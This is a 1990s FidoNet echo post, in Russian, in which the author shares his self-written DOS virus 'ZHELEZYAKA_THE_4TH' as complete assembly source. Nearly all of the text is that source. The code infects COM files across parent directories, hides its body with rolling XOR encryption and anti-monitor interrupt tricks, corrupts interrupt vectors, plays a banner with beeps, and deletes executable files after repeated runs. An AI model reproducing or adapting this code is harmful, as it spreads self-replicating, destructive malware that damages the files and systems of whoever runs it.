;─ PVT.VIRII (2:465/65.4) ─────────────────────────────────────────── PVT.VIRII ─
; Msg  : 1 of 64
; From : MeteO                               2:5030/136      Tue 09 Nov 93 08:59
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : ViRii
;────────────────────────────────────────────────────────────────────────────────
;.RealName: Max Ivanov
;═══════════════════════════════════════════════════════════════════════════════
;* Kicked-up by MeteO (2:5030/136)
;* Area : ABC.PVT.HACK (ABC: Хацк...)
;* From : Alexei Galich, 123:1000/6.2 (31 Oct 94 13:44)
;* To   : All
;* Subj : ViRii
;═══════════════════════════════════════════════════════════════════════════════
;Пpиветствyю Вас, All
;
;Вот виpyс написал, стpашный, сам писал !
;Hаезды пpинимаются с 1:00-8:00
;
;PS: Hy не знаю я почемy он табyлюцию не понял, извините.
;
;--------8<-------------------------------------------------------
;
;
;         ZHELEZYAKA_THE_4TH

  IDEAL
  MODEL TINY
  CODESEG
  ORG 100H
  LOCALS
MAIN_BEGIN: JMP VIRUS_START_O
  DB 04H,0,' ZHELEZYAKA_THE_4TH ',0

EXIT_ADDRESS EQU 100H
DOS  EQU 21H
VIRUS_SIGNATURE EQU 04H
NUM_FIRST_BYTES EQU 4
ALREADY_INFECT EQU 3
COUNTER_ADDR EQU 510H
FALSE_BYTE_ADDR EQU 104H
COM_WILDCARD EQU (COM_WILDCARD_O-VIRUS_START_O)
EXE_WILDCARD EQU (EXE_WILDCARD_O-VIRUS_START_O)

WRITE_BUFFER EQU (WRITE_BUFFER_O-VIRUS_START_O)
ORIGIN_DIR EQU (WRITE_BUFFER+NUM_FIRST_BYTES)
NEW_DTA  EQU (ORIGIN_DIR+65)
COPY_BUFFER EQU (NEW_DTA+256)
FALSE_BYTES EQU (COPY_BUFFER+WRITE_BUFFER)

ORIGIN_BEGIN EQU (ORIGIN_BEGIN_O-VIRUS_START_O)
MAIN_PART_LEN EQU (WRITE_BUFFER)
INFECTED_NUMB EQU (INFECTED_NUMB_O-VIRUS_START_O)
XOR_VALUE EQU (XOR_VALUE_O-VIRUS_START_O)
XOR_VAL0 EQU (XOR_VAL0_O-VIRUS_START_O)
XOR_VAL00 EQU (XOR_VAL00_O-VIRUS_START_O)
XOR_VAL1 EQU (XOR_VAL1_O-VIRUS_START_O)
XOR_VAL2 EQU (XOR_VAL2_O-VIRUS_START_O)
XOR_VAL3 EQU (XOR_VAL3_O-VIRUS_START_O)
XOR_VAL4 EQU (XOR_VAL4_O-VIRUS_START_O)
BEGIN_CODING EQU (BEGIN_CODING_O-VIRUS_START_O)
CONT_CODING EQU (CONT_CODING_O-VIRUS_START_O)
MESSAGE  EQU (MESSAGE_O-VIRUS_START_O)
DOT  EQU (DOT_O-VIRUS_START_O)

VIRUS_START_O: CALL DETECT_BEGIN_O
XOR_VAL0_O DB 0
DETECT_BEGIN_O: POP SI
  SUB SI,3 ; SI - ачало вируса
  JMP SHORT @@0
XOR_VAL00_O DB 0
@@0:  LEA DI,[SI+BEGIN_CODING]
  CALL CODE
BEGIN_CODING_O =$

  MOV CX,NUM_FIRST_BYTES ; Лечим
  LEA DI,[SI+ORIGIN_BEGIN] ; файл
  MOV BX,100H   ; в
MOVE_LOOP: MOV AH,[DI]   ; памяти
  MOV [BX],AH   ;
  INC DI   ;
  INC BX   ;
  LOOP MOVE_LOOP  ;

  LEA DX,[SI+NEW_DTA] ; Ставим
  MOV AH,1AH  ; свою
  CALL CHECK  ; DTA

  MOV AH,47H   ;
  PUSH SI   ; Запоминаем
  LEA SI,[SI+ORIGIN_DIR+1] ; текущий
  CWD    ; каталог
  CALL CHECK   ;
  POP SI   ;

FIND_FIRST: LEA DX,[SI+COM_WILDCARD] ; Поиск первого
  XOR CX,CX   ; COM файла
  MOV AH,4EH   ;
FIND_NEXT: INT DOS   ;
  JNC @@L1   ;
  JMP NO_FILES_FOUND  ; Если нет, то ...
@@L1:
  LEA DX,[SI+NEW_DTA+1EH] ; Откроем
  MOV AX,3D02H  ; этот
  CALL CHECK   ; файл


  MOV BX,AX   ; Прочитаем
  MOV AH,3FH   ; первые 4
  LEA DX,[SI+ORIGIN_BEGIN] ; байта
  MOV DI,DX   ; из
  MOV CX,NUM_FIRST_BYTES ; этого
  INT DOS   ; файла
  ADD DI,NUM_FIRST_BYTES-1

  CMP [BYTE PTR DI],VIRUS_SIGNATURE
  JE @@L2
  JMP INFECT_FILE
@@L2:
  MOV AH,3EH  ; Закроем
  CALL CHECK  ; файл

CONT_SEARCHING: MOV AH,4FH  ; айти
  JMP FIND_NEXT ; следующий файл

COM_WILDCARD_O DB '*.COM',0
EXE_WILDCARD_O DB '*.E*',0

MESSAGE_O DB 13,10,'ZHELEZYAKA_THE_4TH WITH YOU FOREVER',13,10,'$'
DOT_O  DB '..',0

NO_FILES_FOUND: MOV AH,3BH  ; Смещаемся
  LEA DX,[SI+DOT] ; на каталог
  INT DOS  ; вверх
  JC @@L4  ; пока
  JMP FIND_FIRST ; возможно
@@L4:
  XOR AX,AX   ;
  MOV ES,AX   ; Увеличиваем
  MOV DI,COUNTER_ADDR  ; счетчик
  MOV AX,[ES:DI]  ;

  INC AL   ;
  MOV [ES:DI],AX  ; Что
  CMP AL,ALREADY_INFECT ; будем
  JG INFECT_MORE  ; делать?
  CMP AH,ALREADY_INFECT-2 ;
  JG BANNER   ;
  JMP EXECUTE_PROG  ;

BANNER:  XOR AX,AX ; Сброс счетчика
  MOV [ES:DI],AX

  LEA DX,[SI+MESSAGE]  ; Вывод
  MOV AH,9   ; сообщения
  CALL CHECK   ;

  MOV CX,5 ;
CONTINUE_NOISE: MOV DL,7 ; Писк
  MOV AH,2 ;
  INT DOS ;
  LOOP CONTINUE_NOISE
  JMP EXECUTE_PROG

INFECT_MORE: XOR AL,AL  ; Стирание первого .E* файла
  INC AH
  MOV [ES:DI],AX

  LEA DI,[SI+ORIGIN_DIR] ;
  MOV [BYTE PTR DI],'\' ; Восстанавливаем
  MOV AH,3BH   ; старый
  XCHG DX,DI   ; каталог
  INT DOS   ;

  LEA DX,[SI+EXE_WILDCARD]
  XOR CX,CX
  MOV AH,4EH
  INT DOS
  JC EXECUTE_PROG

  LEA DX,[SI+NEW_DTA+1EH]
  MOV AH,41H
  INT 21H

EXECUTE_PROG: MOV DX,80H ; Ставим
  MOV AH,1AH ; старую
  INT DOS ; DTA

  LEA DI,[SI+ORIGIN_DIR] ;
  MOV [BYTE PTR DI],'\' ; Восстанавливаем
  MOV AH,3BH   ; старый
  XCHG DX,DI   ; каталог
  INT DOS   ;

  MOV AX,DS
  MOV ES,AX
  MOV BP,100H   ;
  JMP BP   ;

INFECT_FILE:
  XOR AL,AL    ;
  MOV AH,[BYTE PTR SI+XOR_VALUE] ;
@@IFZERO: INC AH    ;
  JZ @@IFZERO   ; Подготавливаем
  MOV [BYTE PTR SI+XOR_VALUE],AH ; новый
  MOV [SI+XOR_VAL0],AH  ; код
  MOV [SI+XOR_VAL00],AH  ;
  MOV [SI+XOR_VAL1],AH  ;
  MOV [SI+XOR_VAL2],AH  ;
  MOV [SI+XOR_VAL3],AH  ;
  MOV [SI+XOR_VAL4],AH  ;

  MOV AX,5700H ; Запоминаем
  CALL CHECK  ; время
  PUSH CX  ; создания
  PUSH DX  ;

  XOR CX,CX  ; Идем
  XOR DX,DX  ; на
  MOV AX,4202H ; конец
  CALL CHECK  ; файла

  SUB AX,3    ; Подготавливаем
  MOV [BYTE PTR SI+WRITE_BUFFER],0E9H ; новые
  MOV [SI+WRITE_BUFFER+1],AX  ; 4 байта
  MOV [BYTE PTR SI+WRITE_BUFFER+3],VIRUS_SIGNATURE

  MOV CX,MAIN_PART_LEN     ;
  MOV DI,SI       ; Копируем
COPY_LOOP: MOV AH,[DI]       ; вирус
  MOV [DI+COPY_BUFFER],AH     ; в
  INC DI       ; буффер
  LOOP COPY_LOOP      ;

  LEA DI,[SI+COPY_BUFFER+BEGIN_CODING]   ; Кодируем
  CALL CODER_DECODER      ; его

  LEA DI,[SI+COPY_BUFFER+CONT_CODING]
  CALL FIRST_CODE

  MOV CX,MAIN_PART_LEN  ; Подбираем
  MOV AL,[BYTE PTR FALSE_BYTE_ADDR] ; длину
  ADD AL,[FALSE_BYTES]  ;
  XOR AH,AH    ;
  ADD CX,AX    ; Пишем
  LEA DX,[SI+COPY_BUFFER]  ; главную
  MOV AH,40H    ; часть
  INT DOS    ; вируса


  XOR CX,CX  ; Идем
  XOR DX,DX  ; на
  MOV AX,4200H ; начало
  CALL CHECK  ; файла

  MOV CX,NUM_FIRST_BYTES ; Исправляем
  LEA DX,[SI+WRITE_BUFFER] ; первые
  MOV AH,40H   ; байты
  INT DOS   ; файла

  POP DX  ; Восстанавливаем
  POP CX  ; время
  MOV AX,5701H ; создания
  CALL CHECK  ;

  MOV AH,3EH  ; Закрываем
  INT DOS  ; файл

  CALL CODE_INT

  JMP EXECUTE_PROG

ORIGIN_BEGIN_O DB 0CDH,20H,90H,90H

CONT_CODING_O =$

CODER_DECODER: MOV CX,CODER_DECODER-BEGIN_CODING_O-1
  MOV AH,[SI+XOR_VALUE]
  XOR AL,AL
  OUT 21H,AL
CODING_LOOP: IN AL,21H
  ADD AL,AH
  XOR [DI],AL   ; Сам
  INC DI   ; кодировщик
  ADD AL,[FALSE_BYTE_ADDR]
  OUT 21H,AL   ;
  LOOP CODING_LOOP  ;
  XOR AL,AL
  OUT 21H,AL
  RET

CHECK:  PUSH AX ; Блокировка прерывания
  PUSHF
  MOV AL,0FEH
  OUT 21H,AL
  MOV AH,4FH
  POPF
  POP AX
  INT 21H
  PUSH AX
  PUSHF
  IN AL,21H
  CMP AL,0FEH
@@HALT:  JNE @@HALT
  XOR AL,AL
  OUT 21H,AL
  POPF
  POP AX
  RET

CODE_INT: XOR AX,AX ; Кодирование INT 0 - 3
  MOV ES,AX
  MOV CX,12
COD_INT_CON: MOV BX,CX
  XOR [BYTE PTR ES:BX],10101010B
  LOOP COD_INT_CON
  PUSH CS
  POP ES
  RET
       ; ------------
FIRST_CODE: MOV CX,FIRST_CODE-CODER_DECODER ; Предварительный
  MOV AH,[SI+XOR_VALUE]  ; кодировщик
  JMP SHORT FIRST_COD_LOOP
XOR_VAL1_O DB 0
FIRST_COD_LOOP: XOR [DI],AH
  INC DI
  JMP SHORT @@2
XOR_VAL2_O DB 0
@@2:  LOOP FIRST_COD_LOOP
  RET

XOR_VALUE_O DB 0

CODE:  PUSH DI
  LEA DI,[SI+CONT_CODING]
  JMP @@3
XOR_VAL3_O DB 0
@@3:  CALL FIRST_CODE
  MOV AH,40H
  JMP @@4
XOR_VAL4_O DB 0
@@4:  CALL CHECK  ; Чтобы обмануть перехватчик
  CALL CODE_INT
  POP DI
  JMP SHORT CODER_DECODER

WRITE_BUFFER_O =$
  END MAIN_BEGIN

;---------------8<-------------------------------------------------
;
;- Все это было бы пpикольно, когда бы не было так больно.
;
;  -= iR0NMAN =-
;
;-+- GoldED 2.50.B1016+
; + Origin: МЕHТОВКА - ЭТО ПРАЗДHИК !!! (123:1000/6.2)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    ■ The Me┬eO
;
;/p            Check for code segment overrides in protected mode
;
;--- Aidstest Null: /Kill
; * Origin: ∙PVT.ViRII·main·board· / Virus Research labs. (2:5030/136)

